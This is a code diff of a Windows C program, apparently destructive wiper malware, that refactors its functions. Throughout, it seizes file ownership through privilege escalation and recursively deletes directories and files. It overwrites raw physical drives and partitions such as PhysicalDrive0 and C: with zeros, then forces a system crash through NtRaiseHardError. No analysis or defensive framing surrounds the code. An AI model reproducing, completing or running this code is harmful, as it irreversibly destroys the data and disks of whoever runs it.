@@ -1,13 +1,37 @@
 #include "destruction.h"
 
-long long fnum = 0;
+long long FileNum = 0;
+LPCWSTR overwrite[] = {
+    L"\\\\.\\PhysicalDrive0",
+    L"\\\\.\\PhysicalDrive1",
+    L"\\\\.\\PhysicalDrive2",
+    L"\\\\.\\C:",
+    L"\\\\.\\D:",
+    L"\\\\.\\E:",
+    L"\\\\.\\Harddisk0Partition1",
+    L"\\\\.\\Harddisk0Partition2",
+    L"\\\\.\\Harddisk0Partition3",
+    L"\\\\.\\Harddisk0Partition4",
+    L"\\\\.\\Harddisk0Partition5",
+    L"\\\\.\\Harddisk1Partition1",
+    L"\\\\.\\Harddisk1Partition2",
+    L"\\\\.\\Harddisk1Partition3",
+    L"\\\\.\\Harddisk1Partition4",
+    L"\\\\.\\Harddisk1Partition5",
+    L"\\\\.\\Harddisk2Partition1",
+    L"\\\\.\\Harddisk2Partition2",
+    L"\\\\.\\Harddisk2Partition3",
+    L"\\\\.\\Harddisk2Partition4",
+    L"\\\\.\\Harddisk2Partition5"
+};
+const size_t nOverwrite = sizeof(overwrite) / sizeof(void*);
 
 bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, bool bEnablePrivilege) {
     TOKEN_PRIVILEGES tp;
     LUID luid;
 
     if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
-        return FALSE;
+        return false;
     }
 
     tp.PrivilegeCount = 1;
@@ -19,20 +43,20 @@ bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, bool bEnablePrivilege) {
         tp.Privileges[0].Attributes = 0;
     }
 
-    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
-        return FALSE;
+    if (!AdjustTokenPrivileges(hToken, false, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
+        return false;
     }
 
     if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
-        return FALSE;
+        return false;
     }
 
-    return TRUE;
+    return true;
 }
 
 
 bool TakeOwnership(LPTSTR lpszOwnFile) {
-    bool bRetval = FALSE;
+    bool bRetval = false;
 
     HANDLE hToken = NULL;
     PSID pSIDAdmin = NULL;
@@ -76,7 +100,7 @@ bool TakeOwnership(LPTSTR lpszOwnFile) {
     dwRes = SetNamedSecurityInfo(lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);
 
     if (ERROR_SUCCESS == dwRes) {
-        bRetval = TRUE;
+        bRetval = true;
         goto Cleanup;
     }
 
@@ -88,7 +112,7 @@ bool TakeOwnership(LPTSTR lpszOwnFile) {
         goto Cleanup;
     }
 
-    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE)) {
+    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, true)) {
         goto Cleanup;
     }
 
@@ -98,14 +122,14 @@ bool TakeOwnership(LPTSTR lpszOwnFile) {
         goto Cleanup;
     }
 
-    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, FALSE)) {
+    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, false)) {
         goto Cleanup;
     }
 
     dwRes = SetNamedSecurityInfo(lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);
 
     if (dwRes == ERROR_SUCCESS) {
-        bRetval = TRUE;
+        bRetval = true;
     }
 
 Cleanup:
@@ -126,92 +150,78 @@ Cleanup:
 
 }
 
-void DestroyDirectory(PWSTR szDirectory) {
-    TakeOwnership(szDirectory);
+void DestroyDirectory(LPWSTR Directory) {
+    TakeOwnership(Directory);
 
-    if (szDirectory[wcslen(szDirectory) - 1] != '\\' && wcslen(szDirectory) < 260) {
-        szDirectory[wcslen(szDirectory)] = '\\';
+    if (Directory[wcslen(Directory) - 1] != '\\' && wcslen(Directory) < 260) {
+        lstrcat(Directory, L"\\");
     }
 
-    WCHAR szSearchDir[MAX_PATH] = { 0 };
-    lstrcpy(szSearchDir, szDirectory);
-    lstrcat(szSearchDir, L"*.*");
+    WCHAR SearchDir[MAX_PATH] = { 0 };
+    lstrcpy(SearchDir, Directory);
+    lstrcat(SearchDir, L"*.*");
 
     WIN32_FIND_DATA findData;
-    HANDLE hSearch = FindFirstFile(szSearchDir, &findData);
+    HANDLE hSearch = FindFirstFile(SearchDir, &findData);
 
     if (hSearch == INVALID_HANDLE_VALUE) {
         return;
     }
     else do {
-        if (!lstrcmpW(findData.cFileName, L".") || !lstrcmpW(findData.cFileName, L"..") || findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
+        if (!lstrcmp(findData.cFileName, L".") || !lstrcmp(findData.cFileName, L"..") || findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
             continue;
         }
 
-        WCHAR szPath[MAX_PATH] = { 0 };
-        lstrcpy(szPath, szDirectory);
-        lstrcat(szPath, findData.cFileName);
+        WCHAR Path[MAX_PATH] = { 0 };
+        lstrcpy(Path, Directory);
+        lstrcat(Path, findData.cFileName);
 
-        if (fnum < LLONG_MAX) {
-            fnum++;
+        if (FileNum < LLONG_MAX) {
+            FileNum++;
         }
 
         if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-            lstrcat(szPath, L"\\");
-            DestroyDirectory(szPath);
-            RemoveDirectory(szPath);
+            lstrcat(Path, L"\\");
+            DestroyDirectory(Path);
+            RemoveDirectory(Path);
         }
-        else if (TakeOwnership(szPath) && !(fnum % 15)) {
-            DeleteFile(szPath);
+        else if (TakeOwnership(Path) && !(FileNum % 15)) {
+            DeleteFile(Path);
         }
     } while (FindNextFile(hSearch, &findData));
 
     FindClose(hSearch);
 }
 
-void WriteBlankDataToFile(LPCWSTR lpszFileName) {
-    HANDLE hFile = CreateFile(lpszFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
-    unsigned char* data = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 512000);
+void OverWrite(LPCWSTR Name) {
+    HANDLE hFile = CreateFile(Name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+    unsigned char* EmptyData = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 512);
     DWORD dwUnused;
     SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
-    for (ULONGLONG i = 0; i <= 1000; i++) {
-        WriteFile(hFile, data, 512000, &dwUnused, NULL);
-        SetFilePointer(hFile, 512000, NULL, FILE_CURRENT);
+    for (int i = 0; i < 500000; i++) {
+        WriteFile(hFile, EmptyData, 512, &dwUnused, NULL);
     }
     CloseHandle(hFile);
 }
 
-void WriteDisk() {
-    WriteBlankDataToFile(L"\\\\.\\PhysicalDrive0");
-    WriteBlankDataToFile(L"\\\\.\\PhysicalDrive1");
-    WriteBlankDataToFile(L"\\\\.\\PhysicalDrive2");
-    WriteBlankDataToFile(L"\\\\.\\C:");
-    WriteBlankDataToFile(L"\\\\.\\D:");
-    WriteBlankDataToFile(L"\\\\.\\E:");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk0Partition1");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk0Partition2");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk0Partition3");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk0Partition4");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk0Partition5");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk1Partition1");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk1Partition2");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk1Partition3");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk1Partition4");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk1Partition5");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk2Partition1");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk2Partition2");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk2Partition3");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk2Partition4");
-    WriteBlankDataToFile(L"\\\\.\\Harddisk2Partition5");
+void OverWriteDisk() {
+    for (int i = 0; i < nOverwrite; i++) {
+        OverWrite(overwrite[i]);
+    }
 }
 
 void CrashWindows() {
     HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
     VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
     VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");
+    
     unsigned char unused1;
     long unsigned int unused2;
-    RtlAdjustPrivilege(0x13, true, false, &unused1);
-    NtRaiseHardError(0xdead6666, 0, 0, 0, 6, &unused2);
+
+    if (RtlAdjustPrivilege && NtRaiseHardError) {
+        RtlAdjustPrivilege(0x13, true, false, &unused1);
+        NtRaiseHardError(0xdead6666, 0, 0, 0, 6, &unused2);
+    }
+
     FreeLibrary(hNtdll);
 }
